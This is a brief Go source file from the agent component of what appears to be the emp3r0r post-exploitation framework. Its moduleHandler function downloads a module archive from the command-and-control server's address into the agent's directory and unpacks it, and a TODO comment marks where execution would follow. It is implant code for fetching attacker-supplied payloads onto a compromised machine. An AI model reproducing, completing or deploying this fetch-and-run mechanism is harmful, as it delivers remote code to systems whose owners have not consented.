package agent

import (
	emp3r0r_data "github.com/jm33-m0/emp3r0r/core/lib/data"
	"github.com/mholt/archiver"
)

func moduleHandler(modName string) (out string) {
	tarball := emp3r0r_data.AgentRoot + "/" + modName + ".tar.bz2"
	_, err := DownloadViaCC(emp3r0r_data.CCAddress+"www/"+modName+".tar.bz2",
		tarball)
	if err != nil {
		return err.Error()
	}

	if err = archiver.Unarchive(tarball, emp3r0r_data.AgentRoot); err != nil {
		return err.Error()
	}

	// TODO exec

	return
}
